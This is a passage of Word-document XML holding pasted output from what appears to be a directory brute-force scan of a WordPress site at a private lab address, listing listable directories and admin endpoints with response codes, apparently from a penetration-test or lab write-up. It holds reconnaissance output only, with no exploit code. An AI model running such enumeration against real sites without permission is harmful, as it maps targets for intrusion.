        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>---- Entering directory: http://172.16.221.237/wordpress/wp-includes/ ----</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E107DC3" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59B58CC3" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">    (Use mode '-w' if you want to scan it anyway)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24E5F679" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">                                                                                                                                                                                                                                          </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="252D4D6F" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>---- Entering directory: http://172.16.221.237/wordpress/wp-admin/css/ ----</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56006E1E" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="698D6A16" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">    (Use mode '-w' if you want to scan it anyway)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="712BAB20" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">                                                                                                                                                                                                                                          </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3350E25D" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>---- Entering directory: http://172.16.221.237/wordpress/wp-admin/images/ ----</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4108C774" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08D8736D" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">    (Use mode '-w' if you want to scan it anyway)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72D0DE9B" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">                                                                                                                                                                                                                                          </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51F8E17C" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>---- Entering directory: http://172.16.221.237/wordpress/wp-admin/includes/ ----</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53EF3194" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A4DEB4F" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">    (Use mode '-w' if you want to scan it anyway)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A4908CC" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">                                                                                                                                                                                                                                          </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EE33E72" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>---- Entering directory: http://172.16.221.237/wordpress/wp-admin/js/ ----</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EDF6812" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BA8270C" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">    (Use mode '-w' if you want to scan it anyway)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CEECD26" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">                                                                                                                                                                                                                                          </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20412A2F" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>---- Entering directory: http://172.16.221.237/wordpress/wp-admin/maint/ ----</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EFC1ED1" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29373EA6" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">    (Use mode '-w' if you want to scan it anyway)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="476B308F" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">                                                                                                                                                                                                                                          </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7632B803" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>---- Entering directory: http://172.16.221.237/wordpress/wp-admin/network/ ----</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12CA31AB" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-admin/network/admin (CODE:302|SIZE:0)                                                                                                                                                                </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71E03A38" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-admin/network/admin.php (CODE:302|SIZE:0)                                                                                                                                                            </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42267306" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-admin/network/edit (CODE:302|SIZE:0)                                                                                                                                                                 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5817909C" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-admin/network/index (CODE:302|SIZE:0)                                                                                                                                                                </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B138BF0" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-admin/network/index.php (CODE:302|SIZE:0)                                                                                                                                                            </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57EC32CE" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-admin/network/menu (CODE:500|SIZE:0)                                                                                                                                                                 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B65E0A8" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-admin/network/plugins (CODE:302|SIZE:0)                                                                                                                                                              </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E683C03" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-admin/network/profile (CODE:302|SIZE:0)                                                                                                                                                              </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FD314A8" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-admin/network/settings (CODE:302|SIZE:0)                                                                                                                                                             </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FCC5B82" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-admin/network/setup (CODE:302|SIZE:0)                                                                                                                                                                </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DDF420D" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-admin/network/sites (CODE:302|SIZE:0)                                                                                                                                                                </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68F5AC8F" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-admin/network/themes (CODE:302|SIZE:0)                                                                                                                                                               </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33E9E0DD" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-admin/network/update (CODE:302|SIZE:0)                                                                                                                                                               </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E643BE1" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-admin/network/upgrade (CODE:302|SIZE:0)                                                                                                                                                              </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5659E60D" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-admin/network/users (CODE:302|SIZE:0)                                                                                                                                                                </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51DB6D38" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">                                                                                                                                                                                                                                          </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69F9D7C8" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>---- Entering directory: http://172.16.221.237/wordpress/wp-admin/user/ ----</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30D7F6B6" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-admin/user/admin (CODE:302|SIZE:0)                                                                                                                                                                   </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="682082E6" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-admin/user/admin.php (CODE:302|SIZE:0)                                                                                                                                                               </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="424AA924" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-admin/user/index (CODE:302|SIZE:0)                                                                                                                                                                   </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4547A005" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-admin/user/index.php (CODE:302|SIZE:0)                                                                                                                                                               </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67D2C6C4" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-admin/user/menu (CODE:500|SIZE:0)                                                                                                                                                                    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C203D13" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-admin/user/profile (CODE:302|SIZE:0)                                                                                                                                                                 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BD3BCA6" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">                                                                                                                                                                                                                                          </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24F8EF5E" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>---- Entering directory: http://172.16.221.237/wordpress/wp-content/languages/ ----</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D03B26D" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11E0F22B" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">    (Use mode '-w' if you want to scan it anyway)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DB704C1" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">                                                                                                                                                                                                                                          </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="713E5599" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>---- Entering directory: http://172.16.221.237/wordpress/wp-content/plugins/ ----</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F66C796" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-content/plugins/index (CODE:200|SIZE:0)                                                                                                                                                              </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2503D32F" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-content/plugins/index.php (CODE:200|SIZE:0)                                                                                                                                                          </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EC97822" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">                                                                                                                                                                                                                                          </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="321283D3" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>---- Entering directory: http://172.16.221.237/wordpress/wp-content/themes/ ----</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B57F678" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">==&gt; DIRECTORY: http://172.16.221.237/wordpress/wp-content/themes/default/                                                                                                                                                                 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="489711A4" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-content/themes/index (CODE:200|SIZE:0)                                                                                                                                                               </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="668C9552" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">+ http://172.16.221.237/wordpress/wp-content/themes/index.php (CODE:200|SIZE:0)                                                                                                                                                           </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A495556" w14:textId="77777777" w:rsidR="00C67A89" w:rsidRDefault="00C67A89" w:rsidP="00C67A89">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">                                                                                                                                                                                                                                          </w:t>
